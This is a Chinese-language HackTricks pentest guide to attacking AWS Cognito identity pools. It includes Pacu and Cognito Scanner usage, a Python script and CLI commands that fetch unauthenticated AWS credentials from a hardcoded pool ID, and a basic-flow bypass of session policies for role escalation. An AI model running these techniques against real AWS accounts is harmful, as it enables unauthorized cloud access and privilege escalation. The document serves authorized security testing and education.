# Cognito 身份池

<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks中看到您的公司广告** 或 **以PDF格式下载HackTricks** 请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现 [**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

通过身份池，您的用户可以 **获取临时AWS凭证以访问AWS服务**，例如Amazon S3和DynamoDB。身份池支持匿名访客用户，以及以下您可以用来为身份池认证用户的身份提供者：

* Amazon Cognito用户池
* 使用Facebook、Google、Login with Amazon和Sign in with Apple的社交登录
* OpenID Connect (OIDC) 提供者
* SAML身份提供者
* 开发者认证的身份

### Cognito 同步

要生成身份池会话，您首先需要 **生成一个身份ID**。这个身份ID是 **该用户会话的标识**。这些标识可以有多达20个数据集，可以存储多达1MB的键值对。

这对于 **保持用户信息**（他们将始终使用相同的身份ID）非常有用。

此外，服务 **cognito-sync** 是允许 **管理和同步这些信息**（在数据集中，发送信息流和SNS消息等）的服务。

### 渗透测试工具

* [Pacu](https://github.com/RhinoSecurityLabs/pacu)，AWS利用框架，现在包括 "cognito\_\_enum" 和 "cognito\_\_attack" 模块，这些模块自动枚举账户中的所有Cognito资产并标记弱配置、用于访问控制的用户属性等，并且还自动化用户创建（包括MFA支持）和基于可修改的自定义属性、可用的身份池凭证、可假设的id令牌中的角色等进行权限提升。

有关模块功能的描述，请参阅 [博客文章](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)的第2部分。有关安装说明，请参阅主要的 [Pacu](https://github.com/RhinoSecurityLabs/pacu) 页面。

#### 使用方法

尝试针对给定身份池和用户池客户端创建用户和所有权限提升向量的示例 cognito\_\_attack 使用方法：
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
```markdown
示例 cognito__enum 用法，用于收集当前 AWS 账户中可见的所有用户池、用户池客户端、身份池、用户等信息：
```
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) 是一个用 Python 编写的 CLI 工具，它实现了对 Cognito 的不同攻击，包括不必要的账户创建和身份池升级。

#### 安装
```bash
$ pip install cognito-scanner
```
#### 使用方法
```bash
$ cognito-scanner --help
```
有关更多信息，请查看 https://github.com/padok-team/cognito-scanner

## 访问 IAM 角色

### 未经认证

攻击者作为未经认证的用户在 Cognito 应用中**获取 AWS 凭证**所需知道的唯一信息是**身份池 ID**，而且这个**ID 必须硬编码**在 web/移动**应用程序**中才能使用。一个 ID 看起来像这样：`eu-west-1:098e5341-8364-038d-16de-1865e435da3b`（它不可被暴力破解）。

{% hint style="success" %}
默认情况下，通过创建的**IAM Cognito 未经认证角色称为** `Cognito_<Identity Pool name>Unauth_Role`
{% endhint %}

如果你找到了一个硬编码的身份池 ID，并且它允许未经认证的用户，你可以用以下方式获取 AWS 凭证：
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
或者您可以使用以下的 **aws cli 命令**：
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
请注意，默认情况下，未经认证的 Cognito **用户即使通过策略分配了权限，也不会有任何权限**。请检查下一节。
{% endhint %}

### 增强型与基础型认证流程

前一节介绍了**默认的增强型认证流程**。该流程为生成的 IAM 角色会话设置了一个**限制性的**[**会话策略**](../../aws-basic-information/#session-policies)，该策略只允许会话[**使用此列表中的服务**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services)（即使角色可以访问其他服务）。

然而，如果**身份池启用了“基础（经典）流程”**，用户将能够使用该流程获取会话，而**不会有那种限制性会话策略**。

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
如果您收到此**错误**，那是因为**基本流程未启用（默认）**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

拥有一组IAM凭证后，您应该检查[您拥有哪些访问权限](../../#whoami)并尝试[提升权限](../../aws-privilege-escalation/)。

### 已认证

{% hint style="info" %}
请记住，**已认证用户**可能会被授予**不同的权限**，所以如果您可以**在应用程序内注册**，尝试这样做并获取新的凭证。
{% endhint %}

对于**已认证用户访问身份池**也可能有**角色**可用。

对此，您可能需要访问**身份提供者**。如果是**Cognito 用户池**，也许您可以利用默认行为**自己创建一个新用户**。

{% hint style="success" %}
通过**IAM Cognito 认证角色创建默认称为** `Cognito_<Identity Pool name>Auth_Role`
{% endhint %}

无论如何，**以下示例**假设您已经在用于访问身份池的**Cognito 用户池**内登录（不要忘记还可以配置其他类型的身份提供者）。

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# 从上一个命令响应中获取 identity_id
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# 在 IdToken 中您可以找到用户因用户池组而能访问的角色
# 使用 --custom-role-arn 获取特定角色的凭证
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
可以**根据用户登录的身份提供者配置不同的IAM角色**，甚至仅仅**根据用户**（使用声明）。因此，如果您可以通过相同或不同的提供者访问不同的用户，登录并访问他们所有人的IAM角色可能**值得一试**。
{% endhint %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

其他支持HackTricks的方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
